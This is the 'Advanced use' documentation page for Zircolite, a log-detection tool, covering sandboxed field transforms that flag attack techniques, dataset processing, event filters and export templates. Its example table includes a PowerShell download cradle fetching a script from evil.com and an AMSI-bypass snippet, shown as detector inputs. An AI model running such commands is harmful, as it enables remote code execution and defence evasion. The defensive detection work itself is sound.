# Advanced use

## Field transforms

A transform runs a small Python function on a field as events are ingested, in a
[RestrictedPython](https://restrictedpython.readthedocs.io/) sandbox. It can decode Base64
or hex, extract IOCs, categorise values or flag attack techniques, and it usually writes to
a **new** field, so the original stays as it was. Rules and SQL can then match the new field
like any other.

Zircolite ships 55 transforms in 11 categories, all off by default except the two Auditd
ones. They are defined in `config/config.yaml`, with most of their code in
`config/transforms/`.

![Catalogue transforms read CommandLine, Image and QueryName and add new fields beside them, such as Image_TyposquatDetect, which a rule then matches](pics/transforms.svg)

### Enabling transforms

From the command line, by category:

```shell
python3 zircolite.py --transform-list                                    # show categories
python3 zircolite.py --events logs/ --transform-category commandline --transform-category process
python3 zircolite.py --events logs/ --all-transforms                     # everything
```

Or in `config/config.yaml`:

```yaml
transforms_enabled: true

enabled_transforms:
  - proctitle                # Auditd
  - cmd
  # - CommandLine_b64decoded
  # - Image_LOLBinMatch
```

`--transform-category` respects each transform's `source_condition`; `--all-transforms`
ignores it, and the two cannot be combined. No shipped transform lists `xml_input` or
`csv_input`, so on XML and CSV input only `--all-transforms` enables them.

### Defining a transform

Each transform is attached to a field and holds inline code (`type: python`) or names a
file (`type: python_file`):

```yaml
transforms:
  Image:
    - info: "Extract executable name from Image path"
      type: python_file
      file: image_exename.py
      alias: true
      alias_name: Image_ExeName
      source_condition: [evtx_input, json_input]
      enabled: true
```

| Key | Purpose |
|-----|---------|
| `info` | Short description |
| `type` | `python` (inline `code:`) or `python_file` (load `file:`) |
| `code` | Inline code, with `type: python` |
| `file` | A `.py` file, relative to `transforms_dir`, with `type: python_file` |
| `alias` | `true` writes to a new field; `false` replaces the value |
| `alias_name` | The new field's name, with `alias: true` |
| `source_condition` | Input types it applies to: `evtx_input`, `json_input`, `json_array_input`, `xml_input`, `csv_input`, `sysmon_linux_input`, `auditd_input`, `evtxtract_input` |
| `enabled` | Whether it runs |

`transforms_dir` defaults to `transforms/` beside the config file: `config/transforms/` for
the shipped one, `/opt/zircolite/transforms/` for `-c /opt/zircolite/my.yaml`. An absolute
path works too. Transforms run before [splitting](Usage.md#field-splitting).

### Writing transform functions

The function is named `transform` and takes one argument, the field's value. Numbers can
arrive as numbers; use `str(param)` when you expect text.

- **Allowed:** common built-ins (`len`, `int`, `str`, `enumerate`, `min`, `sum`, …), the
  modules `re`, `base64`, `chardet` and `math` (their public functions only), writes into a
  `dict`, `list` or `set`, and augmented assignment (`+=`, …).
- **Blocked:** file and network access, system calls, other imports, and writes to object
  attributes.

![A transform runs inside the RestrictedPython sandbox: a path goes in and the executable name comes out, while file access, imports, network calls and attribute writes are refused](pics/transform-sandbox.svg)

RestrictedPython limits what transform code can do, but it is not a hard security boundary:
only use transforms from sources you trust. Develop against the tester, which uses the same
sandbox:

```shell
python config/transform_tester.py config/transforms/image_exename.py "C:\Windows\cmd.exe"
python config/transform_tester.py my_transform.py --interactive
python config/transform_tester.py --list-builtins
```

Return an empty string when nothing matches (so `!= ''` filters), prefer `alias: true`, keep
it fast (it runs on every event), and scope it with `source_condition`.

### The catalogue

Transforms that find several things join them with `|`. Many keep only the first 2 to 4
findings (20 for `ScriptBlockText_NetworkIOCs`); the extractors that can produce the most —
`CommandLine_URLs`, `CommandLine_RegistryPaths`, `CommandLine_Extracted_Creds`,
`CommandLine_HexStrings` and the four `*_b64decoded` — keep everything.

#### Auditd (`auditd`)

These two replace the value instead of adding a field.

| Field | Produces |
|-------|----------|
| `proctitle` | Hex-encoded proctitle decoded to ASCII |
| `cmd` | Hex-encoded cmd decoded to ASCII |

#### Base64 (`base64`)

| Alias field | Produces |
|-------------|----------|
| `CommandLine_b64decoded` | Decoded Base64 found in the command line |
| `ScriptBlockText_b64decoded` | Decoded Base64 found in a PowerShell script block |
| `Payload_b64decoded` | Decoded Base64 found in a payload field |
| `ServiceFileName_b64decoded` | Decoded Base64 found in a service file name |

All four write `b64_detected_cannot_decode` when Base64 is present but does not decode; an
empty value means none was found.

#### Command line (`commandline`)

| Alias field | Detects | Values |
|-------------|---------|--------|
| `CommandLine_URLs` | HTTP/HTTPS/FTP URLs | the URLs themselves |
| `CommandLine_RegistryPaths` | Registry key paths | the paths themselves |
| `CommandLine_Length` | Length bucket | `SHORT:` `NORMAL:` `LONG:` `VERY_LONG:` `EXTREME:` + the length |
| `CommandLine_EntropyScore` | Shannon entropy | `LOW:` `MEDIUM:` `NORMAL:` `HIGH:` `VERY_HIGH:` + the score |
| `CommandLine_XORIndicators` | XOR operations and keys | `BXOR_OP` `BYTE_XOR` `XOR_LOOP` `XOR_KEY:<key>` |
| `CommandLine_AMSIBypass` | AMSI bypass techniques | `AMSI_REF` `AMSI_INIT_FAILED` `AMSI_CONTEXT` `AMSI_SCAN_BUFFER` `AMSI_REFLECTION` `AMSI_DLL` |
| `CommandLine_HexStrings` | Hex-encoded strings | `0x_HEX` `CONT_HEX` `DECODED:<text>` |
| `CommandLine_EnvVarObfuscation` | Environment-variable abuse | `ENV_CHAR_EXTRACT` `MULTI_ENV_VAR:<n>` `ENV:<VAR>` |
| `CommandLine_DownloadCradle` | Download cradles | `DOWNLOADSTRING` `DOWNLOADFILE` `DOWNLOADDATA` `INVOKE_WEBREQUEST` `INVOKE_RESTMETHOD` `WEBCLIENT` `BITSTRANSFER` `CERTUTIL_DOWNLOAD` `BITSADMIN_DOWNLOAD` `CURL_WGET` |
| `CommandLine_EvasionTechniques` | Hollowing, injection, ETW | `PROCESS_HOLLOWING` `REFLECTIVE_DLL` `TOKEN_MANIPULATION` `MEMORY_ALLOC` `REMOTE_THREAD` `SYSCALL` `ETW_BYPASS` |
| `CommandLine_LateralMovement` | Remote-execution tooling | `LATERAL:` + `PSEXEC` `REMOTE_SERVICE` `WMI` `WINRM` `RDP` `SMB` `SSH` `DCOM` `AT_REMOTE` |
| `CommandLine_DataStaging` | Collection before exfiltration | `STAGING:` + `ARCHIVE` `BULK_COPY` `DB_DUMP` `EMAIL_COLLECT` `FILE_HUNT` `AD_DUMP` |
| `CommandLine_C2Indicators` | C2 framework fingerprints | `C2:` + `COBALT_STRIKE` `METASPLOIT` `SLIVER` `EMPIRE` `HAVOC` `COVENANT` `GENERIC_PIPE` |
| `CommandLine_PersistenceCategory` | Persistence mechanisms | `PERSIST:` + `SCHED_TASK` `SERVICE` `REG_RUN` `WMI_SUB` `STARTUP_FOLDER` `DLL_SEARCH` `CRON` `SYSTEMD` `LAUNCH_AGENT` `BOOT` |
| `CommandLine_ReconIndicators` | Reconnaissance commands | `RECON:` + `SYSINFO` `NETWORK` `USER_ENUM` `DOMAIN` `SHARE` `PROCESS` `SECURITY` |
| `CommandLine_ConcatDeobfuscate` | Concatenation obfuscation | `DEOBF:CARET` `DEOBF:CONCAT:<reconstructed>` `DEOBF:FORMAT_OP` `DEOBF:BACKTICK` `DEOBF:ENV_SUBSTR` |
| `CommandLine_CryptoMining` | Mining pools, wallets, miners | `MINING:PROTOCOL` `MINING:POOL:<name>` `MINING:TOOL:<name>` `MINING:MINER_ARGS` and `MINING:WALLET:` + `MONERO` `BITCOIN` `ETHEREUM` |
| `CommandLine_InjectionTechnique` | Injection technique class | `INJECT:` + `CLASSIC` `ALLOC_WRITE` `HOLLOWING` `APC` `THREAD_HIJACK` `CALLBACK` `MAPPING` `ETW_BYPASS` `SHELLCODE_ALLOC` |

#### Credentials (`credentials`)

| Alias field | Detects | Values |
|-------------|---------|--------|
| `CommandLine_Extracted_Creds` | Credentials passed to `net`, `wmic`, `psexec` | the matched credential strings |

#### Process (`process`)

| Alias field | Detects | Values |
|-------------|---------|--------|
| `Image_ExeName` | — | the executable name, without the path |
| `Image_LOLBinMatch` | Living-off-the-land binaries | `LOLBIN:<name>` |
| `Image_TyposquatDetect` | Typosquatted process names | `TYPOSQUAT:<target>(<techniques>)`, techniques among `HOMOGLYPH` `CHAR_ADD` `CHAR_OMIT` `CHAR_SWAP` |
| `Image_PathAnomaly` | Execution from odd locations | `TEMP_DIR` `WINDOWS_TEMP` `USER_TEMP` `APPDATA` `DOWNLOADS` `USER_DESKTOP` `USER_MEDIA_DIR` `RECYCLE_BIN` `PUBLIC_PROFILE` `PERFLOGS` |
| `Image_StagingDirectory` | Known staging directories | `STAGING:` + `ProgramData` `WindowsTemp` `RootTemp` `PerfLogs` `PublicProfile` `RecycleBin` `UNC_Path` `LinuxTmp` `DevShm` `VendorFolder` |
| `Image_MasqueradeDetect` | System binaries in the wrong directory | `MASQUERADE:<exe_name>` |
| `ParentImage_ExeName` | — | the parent executable name |
| `ParentImage_SpawnAnomaly` | Suspicious parents | `ANOMALY:` + `OFFICE_SPAWN` `BROWSER_SPAWN` `PDF_SPAWN` `SCRIPT_CHAIN` `WMI_SPAWN` `TASK_SPAWN` `JAVA_SPAWN` |

`Image_TyposquatDetect` compares names against 31 impersonation targets of five characters
or more, and never flags the 156 legitimate executables it whitelists, short names such as
`cmd` and `wmic` among them.

#### PowerShell (`powershell`)

| Alias field | Detects | Values |
|-------------|---------|--------|
| `ScriptBlockText_ObfuscationIndicators` | Obfuscation constructs | `CHAR_SUBST` `STR_CONCAT` `JOIN_OP` `FORMAT_STR` `VAR_SUBST` `ENC_CMD` `GZIPSTREAM` `FROMBASE64` `IO_COMPRESSION` `DEFLATESTREAM` `MEMORYSTREAM` |
| `ScriptBlockText_XORPatterns` | XOR keys and loops | `XOR_KEY:<key>` `XOR_LOOP` `BYTE_ARRAY_XOR` `COMMON_XOR_KEY:<key>` |
| `ScriptBlockText_ReflectionAbuse` | .NET reflection abuse | `ASSEMBLY_LOAD` `DYNAMIC_LOAD` `TYPE_REFLECTION` `INVOKE_METHOD` `GET_MEMBER` `DELEGATE_CREATION` |
| `ScriptBlockText_ShellcodeIndicators` | Shellcode execution | `EXEC_MEMORY_ALLOC` `KERNEL32_REF` `NTDLL_REF` `CREATE_THREAD` `NOP_SLED` `MEMORY_COPY` `POINTER_OP` |
| `ScriptBlockText_NetworkIOCs` | Embedded IOCs | `IP:<addr>` `URL:<url>` `DOMAIN:<domain>` |
| `ScriptBlockText_StagerDetect` | Stager patterns | `STAGER:` + `REFLECTION_LOAD` `STAGED_IEX` `INMEMORY_NET` `AMSI_THEN_EXEC` `APPDOMAIN` `RUNSPACE` `CLM_BYPASS` `WIN32_API` |
| `ScriptBlockText_PackerIndicators` | Packers and crypters | `PACKER:` + `GZIP` `DEFLATE` `MULTI_ENCODE` `NESTED_IEX` `CUSTOM_ENCODING` `REVERSAL` `VAR_SUBSTITUTION` `INVOKE_OBFUSCATION` `SECURESTRING` |

#### Network (`network`)

| Alias field | Detects | Values |
|-------------|---------|--------|
| `QueryName_TLD` | — | the top-level domain |
| `QueryName_EntropyScore` | DGA candidates | the entropy score as a number (`0` when not applicable) |
| `QueryName_TyposquatDetect` | Typosquatted well-known domains | `TYPOSQUAT_<class>:<target>(<techniques>)` and `SUSPICIOUS_TLD:<tld>`. Classes: `GOV_US` `GOV_UK` `GOV_EU` `GOV_FR` `GOV_DE` `BANK` `CRYPTO` `TECH` `EMAIL` `CLOUD` `SECURITY` `SHIPPING`. Techniques: `HOMOGLYPH` `CHAR_SWAP` `CHAR_MANIP` `AFFIX` `EMBEDDED` `SIMILAR` |
| `QueryName_SubdomainAnalysis` | Tunnelling-shaped subdomains | `DNS:DEEP_SUB:<depth>` `DNS:LONG_SUB:<length>` `DNS:HEX_SUBDOMAIN` `DNS:B64_SUBDOMAIN` `DNS:HIGH_ENTROPY_SUB` `DNS:NUMERIC_SUB`, the first four kept |
| `DestinationIp_ObfuscationCheck` | Hex/octal/decimal IP encoding | `OBFUSCATED_IP:<value>` |
| `DestinationPort_Category` | Port purpose | 58 labels: named services (`HTTP` `HTTPS` `SMB` `RDP` `SSH` `WINRM` `KERBEROS` …) plus `WELL_KNOWN`, `EPHEMERAL` and `HIGH_PORT`. The full map is in `config/transforms/destinationport_category.py` |

#### File (`file`)

| Alias field | Detects | Values |
|-------------|---------|--------|
| `TargetFileName_URLDecoded` | — | the URL-decoded path |
| `TargetFileName_DoubleExtension` | Double-extension tricks | `DOUBLE_EXT:<ext1>.<ext2>`, e.g. `DOUBLE_EXT:pdf.exe` |
| `TargetFileName_SensitiveFile` | Access to security-sensitive files | `SENSITIVE:` + `CREDENTIAL_STORE` `NTDS` `SSH_KEY` `CERT_PRIVATE` `BROWSER_DATA` `CONFIG` `MEMORY_DUMP` |

#### User and authentication (`user`)

| Alias field | Detects | Values |
|-------------|---------|--------|
| `User_Name` | — | the username, without the domain |
| `User_Domain` | — | the domain part of the user field |
| `LogonType_Description` | — | `SYSTEM` `INTERACTIVE` `NETWORK` `BATCH` `SERVICE` `UNLOCK` `NETWORK_CLEARTEXT` `NEW_CREDENTIALS` `REMOTE_INTERACTIVE` `CACHED_INTERACTIVE` `CACHED_REMOTE_INTERACTIVE` `CACHED_UNLOCK`, or `UNKNOWN:<value>` |

#### Hash (`hash`)

| Alias field | Produces |
|-------------|----------|
| `Hash_MD5` | The MD5 value from Sysmon's `Hashes` field |
| `Hash_SHA256` | The SHA256 value from Sysmon's `Hashes` field |

#### Registry (`registry`)

| Alias field | Detects | Values |
|-------------|---------|--------|
| `TargetObject_SuspiciousRegistry` | Persistence keys | `RUN_KEY` `SERVICE_KEY` `IFEO` `APPINIT_DLLS` `WINLOGON` `COM_HIJACK` `SCHED_TASK` `SECURITY_POLICY` |

### Transforms in action

| Input | Result |
|-------|--------|
| `powershell -c "IEX(New-Object Net.WebClient).DownloadString('http://evil.com/mal.ps1')"` | `CommandLine_DownloadCradle` → `DOWNLOADSTRING\|WEBCLIENT`, `CommandLine_URLs` → `http://evil.com/mal.ps1` |
| `[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')` | `CommandLine_AMSIBypass` → `AMSI_REF\|AMSI_REFLECTION` |
| `C:\Users\Public\svch0st.exe` | `Image_TyposquatDetect` → `TYPOSQUAT:svchost(HOMOGLYPH)` |
| `micros0ft.xyz` | `QueryName_TyposquatDetect` → `TYPOSQUAT_TECH:microsoft(HOMOGLYPH,CHAR_SWAP)\|SUSPICIOUS_TLD:xyz` |

### Querying transform results

New fields are ordinary columns. Keep the database with `--unified-db --dbfile events.db`
and query it:

```sql
-- Obfuscated commands: long and high-entropy
SELECT * FROM logs
WHERE CommandLine_Length LIKE 'EXTREME%' AND CommandLine_EntropyScore LIKE 'VERY_HIGH%';

-- Which injection techniques appear, and how often
SELECT CommandLine_InjectionTechnique, COUNT(*) AS n FROM logs
WHERE CommandLine_InjectionTechnique != '' GROUP BY 1 ORDER BY n DESC;
```

They also appear in `detected_events.json`, under each detection's `matches`:

```shell
# Every LOLBin seen, deduplicated
jq -r '[.[].matches[].Image_LOLBinMatch // empty] | unique | .[]' detected_events.json
```

## Working with large datasets

### Automatic processing optimization

Events go into SQLite databases, either one per input file (**per-file**) or one for all
of them (**unified**). Per-file runs can process files in parallel and free each database
when its file is done; a unified database lets [correlation rules](Usage.md#sigma-correlation-rules)
span files.

![Per-file: each file gets its own database, processed in parallel. Unified: every file goes into one database, where a correlation can link events from different files](pics/db-layouts.svg)

Given several files, auto mode weighs them against free RAM and CPUs, then picks the layout
and whether to run in parallel:

```
[+] Analyzing workload...
    [>] Files       4 (478.2 MB total, avg 119.6 MB)
    [>] System      33.7 GB RAM available, 10 CPUs
    [>] DB Mode     PER-FILE
                    Few large files detected (4 files, avg 119.6 MB)
    [>] Parallel    ENABLED (4 workers)
```

**Layout.** The first matching row decides. With correlation rules loaded and several
files, the layout is unified unless `--no-auto-mode` is set, and `--executor process` and
`--parallel-workers` are ignored.

| # | Condition | Layout | Why |
|---|-----------|--------|-----|
| 1 | One file | Per-file | Nothing to unify |
| 2 | Under 2 GB of RAM free | Per-file | Memory is tight |
| 3 | Estimated footprint over 85% of free RAM | Per-file | Avoid running out |
| 4 | 10+ files averaging 5 MB or less | Unified | Less overhead |
| 5 | Fewer than 5 files averaging 50 MB or more | Per-file | Memory-efficient |
| 6 | 8 GB+ RAM and 3+ files | Per-file | Leaves the files free to run in parallel |
| 7 | Any other run of 10+ files | Unified | Enables cross-file correlation |
| 8 | Anything else | Per-file | Default |

The footprint is an estimate: an in-memory database is 3.5 to 5 times larger than the logs
it holds, so rule 3 triggers at roughly a quarter to a sixth of free RAM.

**Parallelism** applies to per-file runs only, again first match:

| # | Condition | Parallel |
|---|-----------|----------|
| 1 | One file | No |
| 2 | Under 1 GB of RAM free | No |
| 3 | Fewer than 2 workers affordable | No |
| 4 | The **largest** file's estimate over 60% of usable RAM | No |
| 5 | Several files, enough memory | Yes |

**Overriding it:**

```shell
python3 zircolite.py --events logs/ --no-auto-mode            # per-file, threads
python3 zircolite.py --events logs/ --unified-db              # one database
python3 zircolite.py --events logs/ --no-parallel             # one file at a time
python3 zircolite.py --events logs/ --parallel-workers 8
python3 zircolite.py --events logs/ --parallel-memory-limit 80
```

`--parallel-workers` above 1 enables parallelism even where auto mode would not, as long as
the run stays per-file; when auto mode picks unified, add `--no-auto-mode`.

### Parallel processing

`--executor auto` runs files in separate processes when there are at least two, they hold
32 MiB or more in total, and CPU and RAM allow two process workers or more; otherwise it uses
threads, as does `--no-auto-mode`. Processes are much faster on large inputs, because
ingestion and rule matching are Python-heavy, but each one loads the ruleset and costs an
interpreter's memory (128 MB plus its file's estimate). `--executor process` keeps a run of
several files per-file and parallel even where auto mode would unify it. `--no-parallel`,
`--unified-db`, `--strict` and `--profile-rules` take precedence. Results are the same
whichever executor runs them.

The parallel path also:

- **starts the largest files first**, so small ones fill the gaps at the end;
- **waits when memory is tight**: above `--parallel-memory-limit` (85% by default), new files
  wait until running ones finish;
- **recalibrates** its memory estimate after the first file;
- **writes results as each file completes**, except with `--csv`, whose header must cover
  every file.

### Memory usage

Per-file runs free each database after its file; parallel runs hold one per worker. To use
less memory, keep working databases on disk (`--working-db disk`), run fewer workers, and
skip irrelevant files and events with the filters below. Memory is sampled, so the summary's
peak can miss a short spike.

## Filtering

### Early event filtering

Zircolite drops events that no rule can match **before** flattening and inserting them,
based on their **Channel** and **EventID**.

![The ruleset's channel and EventID pairs act as a sieve: matching events reach SQLite, the rest are dropped before insertion](pics/event-filter.svg)

When rules load, each channel the ruleset names gets the set of EventIDs its rules can
match. An event is dropped when no rule claims its channel, or when its EventID is outside
that channel's set. An event with no usable Channel, or no usable EventID on a channel some
rule claims, is **kept**. Zircolite reports the result at load time and in the summary:

```
[+] Event filter enabled: 36 channels, 34 EventID-bounded (214 channel/eventID pairs)
[+]   any EventID allowed on: Security, Windows PowerShell

📊 Events   1,234,567  (412,003 filtered out — 75.0% match rate)
```

The second line names the channels where some rule accepts any EventID, so nothing is
dropped there. "Match rate" is the share of events the filter kept, not the rule matches.

The filter is off:

- with `--no-event-filter`, `event_filter.enabled: false` or `--package` (a package keeps
  every event);
- for Sysmon for Linux and Auditd, which carry no Channel or EventID, unless
  `event_filter.filter_all_sources` is set;
- while a correlation rule is loaded, since absence conditions and observation windows need
  every event;
- when a mapping, alias or active transform can rewrite Channel or EventID (the log says
  which), because the filter reads the raw values before they run;
- when the ruleset yields no usable Channel or EventID bound.

The filter reads Channel and EventID from the raw event through configurable paths, so
pre-flattened and ECS logs work as well as EVTX. `config/config.yaml` ships seven channel
paths and ten EventID paths:

```yaml
event_filter:
  enabled: true
  channel_fields:
    - Event.System.Channel      # EVTX
    - Channel                   # Pre-flattened
    - winlog.channel            # Elastic Winlogbeat
    # … System.Channel, channel, log_name, LogName
  eventid_fields:
    - Event.System.EventID
    - EventID
    - winlog.event_id
    # … seven more
  filter_all_sources: false     # true: filter Sysmon for Linux and Auditd too
```

How the bounds are read from rule SQL is in [Internals → Event filter bounds](Internals.md#event-filter-bounds).

### File filters

Skip files before they are opened:

```shell
python3 zircolite.py --events logs/ --select sysmon                      # names containing "sysmon"
python3 zircolite.py --events logs/ --select operational --avoid defender
python3 zircolite.py --events logs/ --file-pattern "Security*.evtx"      # a glob
python3 zircolite.py --events logs/ --no-recursion                       # top directory only
```

> [!IMPORTANT]
> `--select` and `--avoid` match the **file name only**, never the directory:
> `--select HOST01` does not select `logs/HOST01/Security.evtx`. Use `--file-pattern`, or
> point `--events` at the directory you want.

### Time filters

`--after` (`-A`) and `--before` (`-B`) keep events within a time range. Both bounds are
inclusive and can be used alone.

```shell
python3 zircolite.py --events logs/ -A 2021-06-02T22:40:00 -B 2021-06-02T23:00:00
```

The value is `YYYY-MM-DDTHH:MM:SS`. The filter reads the `--timefield` column (or the
detected one), and understands epoch seconds or milliseconds, a trailing `Z`, UTC offsets
and a space instead of `T`.

### Rule filters

- `-R`/`--rulefilter` skips rules whose title contains the text (case-sensitive); repeat it
  for more. [`--profile-rules`](Usage.md#rule-performance-profiling) shows which rules are
  slow on your data.
- `--min-level` loads only rules at a level or above.
- `--limit N` drops the output of any rule matching more than N events (alerts, for a
  correlation), counted per database: per file in per-file runs, corpus-wide in unified
  ones. It does not save the work of running the rule.

## Templating and formatting

Jinja2 templates reshape detections for other tools:

```shell
python3 zircolite.py --events sample.evtx \
    --template templates/exportForSplunk.tmpl --templateOutput exportForSplunk.json
python3 zircolite.py --events sample.evtx --timesketch
python3 zircolite.py --events sample.evtx --navigator-output
```

Pair one `--templateOutput` with each `--template` to write several at once. The shortcuts
write `timesketch-<RAND>.json` and `navigator-<RAND>.json` (or a name you give), so repeated
exports never overwrite each other. Like `-c` and `-r`, they prefer a template of that name
in the working directory's `templates/`.

### Available templates

| Template | Output | Use case |
|----------|--------|----------|
| `exportForSplunk.tmpl` | NDJSON | Splunk HEC or bulk import |
| `exportForSplunkWithRuleID.tmpl` | NDJSON | Splunk, with the rule ID |
| `exportForELK.tmpl` | NDJSON | Elasticsearch / ELK |
| `exportForZinc.tmpl` | Bulk JSON | OpenSearch/Elasticsearch bulk API, each record after an `index` action line |
| `exportForTimesketch.tmpl` | NDJSON | Timesketch; shortcut `--timesketch` |
| `exportNDJSON.tmpl` | NDJSON | Generic: rule metadata plus event fields |
| `exportSummaryCSV.tmpl` | CSV | One row per rule, for triage |
| `exportForSARIF.tmpl` | JSON | [SARIF](https://sarifweb.azurewebsites.net/), for CI pipelines |
| `exportForAttackNavigator.tmpl` | JSON | [ATT&CK Navigator](https://mitre-attack.github.io/attack-navigator/) layer; shortcut `--navigator-output` |

### Append mode

`--template-append` (or `output.template_append: true`) adds to template output instead of
overwriting it:

```shell
python3 zircolite.py --events logs/ \
    --template templates/exportForSplunk.tmpl --templateOutput exportForSplunk.ndjson \
    --template-append
```

> [!WARNING]
> Append only to **line-oriented** output (NDJSON, bulk JSON). `exportForSARIF.tmpl`
> and `exportForAttackNavigator.tmpl` each write one JSON document, which a second run would
> make invalid.

## Zircolite Viewer

Packages and the offline viewer are described on the [Zircolite Viewer](Viewer.md) page.

## Other tools

The repository's own scripts are in `tools/`, documented in
[`tools/README.md`](https://github.com/wagga40/Zircolite/tree/master/tools):
`sigma-regression.py` runs the SigmaHQ regression suite against a ruleset,
`throughput-benchmark.py` compares Zircolite runs across settings or checkouts, and
`tool-benchmark.py` times Zircolite against Hayabusa and Chainsaw ([Benchmark](Benchmark.md)).

Zircolite also runs inside:

- [KAPE](https://www.kroll.com/en/services/cyber-risk/incident-response-litigation-support/kroll-artifact-parser-extractor-kape),
  through a [module](https://github.com/EricZimmerman/KapeFiles/tree/master/Modules/Apps/GitHub);
- [Velociraptor](https://github.com/Velocidex/velociraptor), through an
  [artifact](https://docs.velociraptor.app/exchange/artifacts/pages/windows.eventlogs.zircolite/).
